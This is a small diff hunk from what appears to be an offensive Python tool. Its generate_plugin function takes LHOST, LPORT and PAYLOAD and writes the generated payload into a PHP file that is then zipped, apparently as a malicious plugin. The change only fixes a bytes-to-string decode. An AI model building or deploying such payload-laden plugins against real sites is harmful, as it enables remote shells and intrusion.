@@ -69,7 +69,7 @@ def generate_plugin(LHOST, LPORT, PAYLOAD):
 	payload_file.write("<?php ")
 	payload_file.close()
 	payload_file = open('wetw0rk_maybe.php','a')
-	payload_file.write(create_payload)
+	payload_file.write(bytes.decode(create_payload))
 	payload_file.write(" ?>")
 	payload_file.close()
 	# Create Zip With Payload
